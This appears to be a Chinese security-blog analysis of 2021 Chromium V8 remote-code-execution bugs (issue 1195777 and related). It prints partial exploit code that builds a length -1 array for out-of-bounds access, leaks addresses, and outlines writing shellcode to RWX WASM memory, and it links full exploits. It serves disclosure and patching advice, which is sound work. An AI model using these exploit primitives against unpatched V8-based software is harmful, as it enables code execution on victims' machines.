> 原文链接: https://www.anquanke.com//post/id/238343 


# Chromium V8 JavaScript引擎远程代码执行漏洞分析讨论


                                阅读量   
                                **349377**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t0182267254e633be9b.jpg)](https://p2.ssl.qhimg.com/t0182267254e633be9b.jpg)



作者：frust@360 Noah Lab

## 0x01-概述

2021年4月13日，安全研究人员[Rajvardhan Agarwal](https://twitter.com/r4j0x00/status/1381643526010597380)在推特公布了本周第一个远程代码执行（RCE）的0Day漏洞，该漏洞可在当前版本（89.0.4389.114）的谷歌Chrome浏览器上成功触发。Agarwal公布的漏洞，是基于Chromium内核的浏览器中V8 JavaScript引擎的远程代码执行漏洞，同时还发布了该漏洞的[PoC](https://github.com/r4j0x00/exploits/tree/master/chrome-0day)。

2021年4月14日，360高级攻防实验室安全研究员[frust](https://twitter.com/frust93717815)公布了本周第二个[Chromium 0day](https://github.com/avboy1337/1195777-chrome0day/blob/main/1195777.html)(Issue 1195777)以及Chrome 89.0.4389.114的poc视频验证。该漏洞会影响当前最新版本的Google Chrome 90.0.4430.72，以及Microsoft Edge和其他可能基于Chromium的浏览器。

Chrome浏览器沙盒可以拦截该漏洞。但如果该漏洞与其他漏洞进行组合，就有可能绕过Chrome沙盒。



## 0x02-漏洞PoC

目前四个漏洞[issue 1126249](https://bugs.chromium.org/p/chromium/issues/detail?id=1126249)、[issue 1150649](https://bugs.chromium.org/p/chromium/issues/detail?id=1150649)、issue 1196683、issue 1195777的exp均使用同一绕过缓解措施手法（截至文章发布，后两个issue尚未公开），具体细节可参考[文章](https://faraz.faith/2021-01-07-cve-2020-16040-analysis/)。

基本思路是创建一个数组，然后调用shift函数构造length为-1的数组，从而实现相对任意地址读写。issue 1196683中关键利用代码如下所示。

```
function foo(a) `{`
......
	if(x==-1) x = 0;
	var arr = new Array(x);//----------------------&gt;构造length为-1数组
	arr.shift();
......
`}`
```

issue 1195777中关键利用代码如下所示：

```
function foo(a) `{`
    let x = -1;
    if (a) x = 0xFFFFFFFF;
    var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));//----------------------&gt;构造length为-1数组
    arr.shift();
    let local_arr = Array(2);
    ......
`}`
```

参考[issue 1126249](https://bugs.chromium.org/p/chromium/issues/detail?id=1126249)和[issue 1150649](https://bugs.chromium.org/p/chromium/issues/detail?id=1150649)中关键poc代码如下所示，其缓解绕过可能使用同一方法。

```
//1126249
function jit_func(a) `{`
	.....
    v5568 = Math.sign(v19229) &lt; 0|0|0 ? 0 : v5568;
    let v51206 = new Array(v5568);
    v51206.shift();
    Array.prototype.unshift.call(v51206);
    v51206.shift();
   .....
`}`

//1150649
function jit_func(a, b) `{`
  ......
  v56971 = 0xfffffffe/2 + 1 - Math.sign(v921312 -(-0x1)|6328);
  if (b) `{`
    v56971 = 0;
  `}`
  v129341 = new Array(Math.sign(0 - Math.sign(v56971)));
  v129341.shift();
  v4951241 = `{``}`;
  v129341.shift();
  ......
`}`
```

国内知名研究员[gengming](https://twitter.com/dmxcsnsbh)和[@dydhh1](https://twitter.com/dydhh1)推特发文将在zer0pwn会议发表议题讲解CVE-2020-1604[0|1]讲过如何绕过缓解机制。本文在此不再赘述。

frust在youtube给出了Chrome89.0.4389.114的poc视频验证；经测试最新版Chrome 90.0.4430.72仍旧存在该漏洞。<br><video style="width: 100%; height: auto;" src="https://rs-beijing.oss.yunpan.360.cn/Object.getFile/anquanke1/Y2hyb21lMC41ZGF5LWlzc3VlMTE5NTc3Ny5tcDQ=" controls="controls" width="300" height="150">﻿您的浏览器不支持video标签 </video>



## 0x03-exp关键代码

exp关键代码如下所示。

```
class LeakArrayBuffer extends ArrayBuffer `{`
        constructor(size) `{`
            super(size);
            this.slot = 0xb33f;//进行地址泄露
        `}`
    `}`
function foo(a) `{`
        let x = -1;
        if (a) x = 0xFFFFFFFF;
        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));//构造长度为-1的数组
        arr.shift();
        let local_arr = Array(2);
        local_arr[0] = 5.1;//4014666666666666
        let buff = new LeakArrayBuffer(0x1000);//
        arr[0] = 0x1122;//修改数组长度
        return [arr, local_arr, buff];
    `}`
    for (var i = 0; i &lt; 0x10000; ++i)
        foo(false);
    gc(); gc();
    [corrput_arr, rwarr, corrupt_buff] = foo(true);
```

通过代码Array(Math.sign(0 – Math.max(0, x, -1)))创建一个length为-1的数组，然后使用LeakArrayBuffer构造内存布局，将相对读写布局成绝对读写。

这里需要说明的是，由于chrome80以上版本启用了地址压缩，地址高4个字节，可以在构造的array后面的固定偏移找到。

先将corrupt_buffer的地址泄露，然后如下计算地址

```
(corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;
```

可以计算出高4字节。

同时结合0x02步骤中实现的相对读写和对象泄露，可实现绝对地址读写。@r4j0x00在issue 1196683中构造length为-1数组后，则通过伪造对象实现任意地址读写。

之后，由于WASM内存具有RWX权限，因此可以将shellcode拷贝到WASM所在内存，实现任意代码执行。

具体细节参考[exp](https://github.com/avboy1337/1195777-chrome0day/blob/main/1195777.html)。

该漏洞目前已[修复](https://chromium-review.googlesource.com/c/v8/v8/+/2826114/3/src/compiler/representation-change.cc#953)。



## 0x04-小结

严格来说，此次研究人员公开的两个漏洞并非0day，相关漏洞在最新的V8版本中已修复，但在公开时并未merge到最新版chrome中。由于Chrome自身拥有沙箱保护，该漏洞在沙箱内无法被成功利用，一般情况下，仍然需要配合提权或沙箱逃逸漏洞才行达到沙箱外代码执行的目的。但是，其他不少基于v8等组件的app（包括安卓），尤其是未开启沙箱保护的软件，仍具有潜在安全风险。

漏洞修复和应用代码修复之间的窗口期为攻击者提供了可乘之机。Chrome尚且如此，其他依赖v8等组件的APP更不必说，使用1 day甚至 N day即可实现0 day效果。这也为我们敲响警钟，不仅仅是安全研究，作为应用开发者，也应当关注组件漏洞并及时修复，避免攻击者趁虚而入。

我们在此也敦促各大软件厂商、终端用户、监管机构等及时采取更新、防范措施；使用Chrome的用户需及时更新，使用其他Chrome内核浏览器的用户则需要提高安全意识，防范攻击。



## 参考链接

[https://chromium-review.googlesource.com/c/v8/v8/+/2826114/3/src/compiler/representation-change.cc](https://chromium-review.googlesource.com/c/v8/v8/+/2826114/3/src/compiler/representation-change.cc)

[https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=476971](https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=476971)

[https://bugs.chromium.org/p/chromium/issues/detail?id=1150649](https://bugs.chromium.org/p/chromium/issues/detail?id=1150649)

[https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=465645](https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=465645)

[https://bugs.chromium.org/p/chromium/issues/detail?id=1126249](https://bugs.chromium.org/p/chromium/issues/detail?id=1126249)

[https://github.com/avboy1337/1195777-chrome0day/blob/main/1195777.html](https://github.com/avboy1337/1195777-chrome0day/blob/main/1195777.html)

[https://github.com/r4j0x00/exploits/blob/master/chrome-0day/exploit.js](https://github.com/r4j0x00/exploits/blob/master/chrome-0day/exploit.js)
